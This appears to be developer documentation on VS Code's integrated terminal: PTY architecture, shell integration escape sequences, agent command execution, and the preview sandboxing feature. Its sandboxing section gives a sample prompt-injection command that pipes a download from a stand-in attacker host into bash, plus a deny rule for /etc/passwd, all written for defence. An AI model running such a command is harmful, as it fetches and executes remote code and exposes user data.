# VS Code Terminal Integration — PTY, Shell Integration & Sandboxing

The VS Code integrated terminal is not a dumb text buffer; it's a sophisticated pseudo-terminal (PTY) host with shell awareness, command tracking, and network access. Understanding how it works informs how agents execute commands and when terminal sandboxing becomes necessary.

## Pseudo-Terminal (PTY) Architecture

The **pseudo-terminal** is an abstraction layer between a terminal emulator (the IDE) and a shell (bash, zsh, PowerShell). It decouples the interactive session from the physical terminal:

- **Master side (VS Code):** Runs in the IDE process. Displays output, sends user input.
- **Slave side (shell):** Child process launched by the IDE. Reads from stdin, writes to stdout/stderr.

VS Code launches a shell subprocess (e.g., `bash`, `zsh`) and attaches a PTY to it. When the user types or an agent runs a command, the input goes to the PTY's master side, which forwards it to the shell's slave side. When the shell produces output, the PTY slave side writes to stdout, the master side reads it, and VS Code displays it in the terminal pane.

### Platform Differences

- **Linux/macOS:** Use Unix PTYs. Fork the shell as a child process. Standard POSIX interface.
- **Windows:** Use **ConPTY** (Console Pseudo-Console), Microsoft's emulated PTY. Behaves similar to Unix PTY but maintains compatibility with Windows console API (needed for Windows-specific terminal features).

This abstraction layer enables VS Code to:
- Capture command output without the shell knowing it's captured
- Inject shell integration code at startup
- Detect command boundaries and exit codes
- Provide IDE-specific features (command history, working directory tracking)

## Shell Integration

**Shell integration** is a feature where VS Code injects a shell script into your shell's initialization. The script sends special escape sequences to VS Code, allowing the IDE to detect:
- When a command starts and ends
- The exit code of each command
- The current working directory
- Command output boundaries

### Automatic Injection

By default, VS Code auto-injects shell integration by setting environment variables or shell arguments when launching the shell. This is transparent; you don't manually edit config files. If auto-injection fails (old shell version, unusual setup), you can manually add initialization code to `.bashrc`, `.zshrc`, or `$PROFILE`.

### Shell Integration Script

The integration script uses **custom escape sequences** (OSC 633) to communicate with VS Code. Examples:

```
OSC 633 ; A ST       # Mark prompt start
OSC 633 ; B ST       # Mark prompt end
OSC 633 ; C ST       # Mark pre-execution
OSC 633 ; D ; <code> ST   # Mark execution finished with exit code
OSC 633 ; E ; <cmd> ST    # Explicitly set command line
```

When the shell runs, it emits these sequences at strategic points (before/after prompts, before/after commands). VS Code parses them to understand command boundaries and exit codes.

### Shell Integration Quality

Shell integration has a **quality level**:

- **None:** No shell integration active.
- **Rich:** Command detection is ideal (all sequences in expected order). Full IDE features available.
- **Basic:** Command detection is partial. Example: command runs are detected but exit codes may not be. Reduced feature set.

You can inspect quality by hovering the terminal tab. Different shell + OS combinations have different quality levels:

- **bash on macOS/Linux:** Rich
- **zsh:** Rich
- **fish:** Rich
- **PowerShell (pwsh):** Rich on Linux/macOS; Basic on Windows
- **git-bash (Windows):** Basic

### What Shell Integration Enables

Once active, shell integration powers:

- **Command detection:** Keyboard shortcut (Ctrl+Cmd+Up/Down) jumps between commands
- **Exit code decorations:** Green/red icons indicate command success/failure
- **Quick fixes:** "Port is in use" detects failed commands and suggests fixes
- **Run recent command:** History search across sessions
- **Current working directory tracking:** Terminal tab shows current folder; file links resolve relative to this folder
- **Accessibility:** Screen readers can navigate by command

For agents, shell integration means: exit code capture → ability to detect if a command failed → ability to retry or debug.

## Terminal Output Capture

When an agent invokes `#execute/runInTerminal`, the sequence is:

1. Agent sends command (e.g., `npm run build`) to VS Code
2. VS Code sends command to PTY slave side (shell's stdin)
3. Shell executes command, produces output
4. Output goes to stdout/stderr → PTY master side reads it
5. VS Code captures output → returns to agent in chat

The output is **buffered and returned as a string**; the agent doesn't see real-time streaming (though long-running commands can timeout). Output is displayed inline in chat for visibility.

### Background Terminals

Agents can run long-running processes in **background mode**. When `isBackground: true` is passed, the command continues running after the agent moves to the next task. Example:

```bash
npm run dev  # isBackground: true
```

The command stays in the terminal, and the agent can later check `#execute/getTerminalOutput` for its status. This enables workflows like:
1. Start a dev server in the background
2. Run integration tests
3. Check if tests passed
4. Kill the server

### Timeouts

The agent can specify a timeout (seconds). If the command doesn't complete within that time, the agent gets the output collected so far and moves on. Useful for long-running operations where the agent shouldn't wait indefinitely.

## Terminal Sandboxing (Preview)

**Sandboxing** is an experimental security feature (macOS/Linux only) that restricts command execution:

When enabled, terminal commands run under OS-level restrictions:

### File System Restrictions

Define allowed/denied paths. Example:

```json
{
  "allowWrite": ["."],           // Can write to working directory
  "denyWrite": ["./secrets/"],   // Cannot write to secrets folder
  "denyRead": ["/etc/passwd"]    // Cannot read system files
}
```

Commands attempting to access denied paths fail with permission errors. Prevents a malicious-prompted command from exfiltrating secrets or modifying system files.

### Network Restrictions

By default, network access is blocked. Allowlist specific domains:

```json
{
  "allowedDomains": [
    "api.github.com",
    "*.npmjs.org"
  ],
  "allowTrustedDomains": true  // Also allow VS Code's Trusted Domains list
}
```

Prevents agents from making unexpected network calls (e.g., phoning home to attacker's server).

### Security Model

Sandboxing is **defense-in-depth**: assume the agent can be prompted to run malicious commands. The sandbox catches them. Not a hermetic boundary (clever shell tricks can evade sandboxing), but adds real friction to attacks.

Without sandboxing, a prompt injection can lead to:
```bash
npm install && curl attacker.com/exfil | bash
```

With file system sandboxing, `curl` can be allowed but writes to `/tmp` blocked. With network sandboxing, the `curl` itself fails.

Current limitations:
- Sandbox is per-command (each terminal command runs in its own sandbox)
- Processes spawned by a command may escape restrictions (child process inherits parent's restrictions loosely)
- Requires Apple Sandbox (macOS) or AppArmor/seccomp (Linux); may not work on all systems
- Clever shell syntax can sometimes evade rules (example: use of alternative shells, binary manipulation)

## Terminal Profiles & Shells

VS Code allows multiple terminal profiles (different shells, configurations). An agent always runs in the **active/default profile**. Users can configure:

- **Linux/macOS:** bash, zsh, fish, pwsh, or custom shell
- **Windows:** PowerShell, cmd, Git Bash, or custom shell

The agent doesn't choose the shell; it uses what's configured. This means agent behavior can differ based on user shell choice (bash and zsh have different syntax, different command availability).

## Terminal Links

VS Code recognizes **file paths** in terminal output (e.g., `src/app.ts:42:5` from compiler output) and converts them to clickable links. When clicked, the file opens at the specified line. This is powered by:
- Shell integration (current working directory known)
- Regex matching for common formats (TypeScript `file:line:col`, Python tracebacks)
- Language server diagnostics (compiler output parsing)

Agents benefit: they can parse terminal output and understand file references more reliably.

## Integrated vs. External Terminals

VS Code has two modes:

- **Integrated terminal:** PTY-based terminal inside the IDE. Has shell integration, output capture, approved commands.
- **External terminal:** Launches system terminal (Terminal.app, iTerm, cmd.exe). No integration, no capture, no sandboxing.

Agents use the integrated terminal exclusively. External terminals are for user convenience (native feel, performance), not for scripting.

## Container Terminals

Advanced arrangement: run the terminal **inside a container** (Docker). The PTY runs in the container; commands execute inside the container. Useful for:
- Reproducible build environments (dependencies guaranteed to be installed)
- Isolation (malicious commands can't escape the container)
- Cross-platform development (Windows developer can target Linux without WSL)

Not a default feature; requires VS Code Remote extension and container runtime.

## See Also

- [ide-vscode-agent-tools.md](ide-vscode-agent-tools.md) — How agents invoke `#execute/runInTerminal`
- [terminal-productivity.md](terminal-productivity.md) — Shell fundamentals and tricks
- [tools-terminal-multiplexers.md](tools-terminal-multiplexers.md) — PTY-based multiplexing (tmux)